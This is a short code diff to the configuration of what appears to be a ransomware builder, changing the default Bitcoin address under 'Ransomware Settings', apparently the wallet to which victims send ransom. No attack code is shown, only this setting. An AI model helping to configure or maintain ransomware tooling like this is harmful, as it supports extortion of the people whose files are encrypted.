@@ -212,7 +212,7 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
                                  " characters (26-35 characters in length",
             "config_area": "Ransomware Settings",
             "validate": True,
-            "default": "12mdKVNfAhLbRDLtRWQFhQgydgU6bUMjay"
+            "default": "bc1q5mc345lx0factn6yj59quvqgulzfxtmf0azqgq"
             }
     ),
     (
